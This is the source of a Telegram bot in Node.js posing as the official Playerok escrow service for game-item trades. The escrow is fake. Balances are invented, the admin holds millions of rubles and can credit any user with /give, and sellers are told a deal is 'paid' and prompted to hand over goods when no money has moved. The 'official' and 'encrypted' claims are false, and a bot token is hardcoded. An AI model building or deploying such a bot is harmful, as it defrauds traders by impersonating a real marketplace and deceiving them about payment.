const { Telegraf, Markup } = require('telegraf');
const http = require('http');
const bot = new Telegraf('8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY');
const ADMIN = 'k13_way', ADMIN_ID = 8886821631;
let users = {}, deals = {}, states = {};

http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(process.env.PORT || 10000);

function init(id, name) {
    const un = name ? name.toLowerCase() : '';
    if (!users[id]) users[id] = { id, username: un, balance: id === ADMIN_ID ? 16699677 : 0, count: 0 };
    else if (un) users[id].username = un;
}
function findId(name) {
    const cl = name.replace('@', '').trim().toLowerCase();
    for (const id in users) { if (users[id].username === cl) return parseInt(id); }
    return null;
}
const menu = Markup.keyboard([['🤝 Создать сделку'], ['💳 Баланс', '🛡️ Безопасность'], ['ℹ️ О Гарант Боте Playerok', '🆘 Поддержка']]).resize();

bot.start((ctx) => { init(ctx.from.id, ctx.from.username); ctx.replyWithMarkdown('Добро пожаловать 👋\n\n✅ *PlayerOk* — специализированный сервис по обеспечению безопасности внебиржевых сделок.\n\n• Комиссия: 1%\n• Поддержка: @sw1zyy01', menu); });
bot.hears('ℹ️ О Гарант Боте Playerok', (ctx) => ctx.reply('💎 Playerok Гарант бот — безопасные сделки в Telegram!'));
bot.hears('🛡️ Безопасность', (ctx) => ctx.reply('🛡️ Гарант Playerok — официальный бот. Все сделки шифруются.'));
bot.hears('🆘 Поддержка', (ctx) => ctx.reply('🆘 Поддержка Playerok Гарант: @sw1zyy01'));
bot.hears('💳 Баланс', (ctx) => {
    init(ctx.from.id, ctx.from.username);
    const u = users[ctx.from.id];
    ctx.replyWithMarkdown(`👑 *ЛИЧНЫЙ КАБИНЕТ PLAYEROK* 👑\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n👤 *Пользователь:* @${ctx.from.username || 'нет'}\n💎 *Статус:* Проверенный трейдер\n📈 *Успешных сделок:* ${u.count}\n\n💵 *Текущий баланс:* [ ${u.balance.toLocaleString('ru-RU')} руб. ]\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`);
});
bot.command('give', (ctx) => {
    if (ctx.from.username?.toLowerCase() !== ADMIN) return ctx.reply('❌ Нет прав.');
    const args = ctx.message.text.split(' ');
    if (args.length !== 3) return ctx.reply('⚠️ /give [ID] [Сумма]');
    const tId = parseInt(args[1]), am = parseInt(args[2]);
    if (isNaN(tId) || isNaN(am) || am <= 0) return ctx.reply('❌ Ошибка.');
    init(tId, null); users[tId].balance += am; ctx.reply('✅ Начислено');
    bot.telegram.sendMessage(tId, `💰 Баланс пополнен: +${am} руб.`).catch(()=>{});
});
bot.hears('🤝 Создать сделку', (ctx) => {
    ctx.reply('👉 Выберите вашу роль:', Markup.inlineKeyboard([[Markup.button.callback('🛒 Купить', 'r_buy'), Markup.button.callback('💰 Продать', 'r_sell')]]));
});
bot.action('r_buy', (ctx) => { ctx.answerCbQuery().catch(()=>{}); states[ctx.from.id] = { step: 'info', type: 'buy' }; ctx.replyWithMarkdown('🛒 *ПОКУПКА*\n\nОтправьте сообщение:\n`[Сумма] [Товар] [@юзернейм_продавца]`\n\nПример: `2500 Standoff 2 Account @user_name`'); });
bot.action('r_sell', (ctx) => { ctx.answerCbQuery().catch(()=>{}); states[ctx.from.id] = { step: 'info', type: 'sell' }; ctx.replyWithMarkdown('💰 *ПРОДАЖА*\n\nОтправьте сообщение:\n`[Сумма] [Товар] [@юзернейм_покупателя]`\n\nПример: `1500 Нож в Standoff 2 @user_name`'); });

bot.on('text', (ctx, next) => {
    const uid = ctx.from.id, st = states[uid];
    if (!st || st.step !== 'info') return next();
    delete states[uid];
    const match = ctx.message.text.trim().match(/^(\d+)\s+(.+?)\s+(@[A-Za-z0-9_]{4,})$/);
    if (!match) return ctx.reply('❌ Неверный формат.');
    const am = parseInt(match[1]), item = match[2], targetUser = match[3];
    const tId = findId(targetUser);
    if (!tId) return ctx.reply(`❌ Пользователь ${targetUser} не найден в базе. Он должен нажать /start.`);
    if (uid === tId) return ctx.reply('❌ Нельзя с самим собой.');
    const dId = Math.floor(100000 + Math.random() * 900000);
    const bId = st.type === 'buy' ? uid : tId, sId = st.type === 'buy' ? tId : uid;
    deals[dId] = { id: dId, bId, sId, am, item, status: 'wait' };
    ctx.reply(`⏳ Сделка №${dId} создана. Ожидаем подтверждения.`);
    bot.telegram.sendMessage(tId, `🔔 *Новая сделка №${dId}!*\n\nТовар: ${item}\nСумма: ${am} руб.\n\nВы готовы?`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять', `ok_${dId}`)]]) }).catch(()=>{ctx.reply('❌ Ошибка отправки.');});
});
bot.action(/^ok_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'wait') return ctx.reply('❌ Ошибка.');
    d.status = 'pay'; ctx.editMessageText(`🤝 Вы приняли сделку №${dId}. Ожидайте оплату.`);
    bot.telegram.sendMessage(d.bId, `🎉 Сделка №${dId} принята!\n\nК оплате: ${d.am} руб.`, Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить', `pay_${dId}`)]]));
});
bot.action(/^pay_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'pay') return ctx.reply('❌ Ошибка.');
    init(d.bId, ctx.from.username); if (users[d.bId].balance < d.am) return ctx.reply('❌ Недостаточно средств.');
    users[d.bId].balance -= d.am; d.status = 'send'; ctx.editMessageText(`💰 Сделка №${dId} оплачена! Ожидайте товар.`);
    bot.telegram.sendMessage(d.sId, `📢 Сделка №${dId} оплачена! Передайте товар в ЛС и нажмите кнопку:`, Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${dId}`)]]));
});
bot.action(/^sent_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.sId || d.status !== 'send') return ctx.reply('❌ Ошибка.');
    d.status = 'check'; ctx.editMessageText(`👌 Товар по сделке №${dId} передан.`);
    bot.telegram.sendMessage(d.bId, `🔔 Товар №${dId} передан! Проверьте и подтвердите:`, Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить', `done_${dId}`)]]));
});
bot.action(/^done_(\d+)$/, (ctx) => {
    ctx.answerCbQuery().catch(()=>{});
    const dId = parseInt(ctx.match[1]), d = deals[dId];
    if (!d || ctx.from.id !== d.bId || d.status !== 'check') return ctx.reply('❌ Ошибка.');
    d.status = 'end'; init(d.sId, null); users[d.sId].balance += d.am; users[d.bId].count++; users[d.sId].count++;
    ctx.editMessageText(`🎉 Сделка №${dId} завершена!`);
    bot.telegram.sendMessage(d.sId, `💰 Сделка №${dId} завершена! +${d.am} руб.`);
});
bot.launch().then(() => console.log('🚀 OK'));
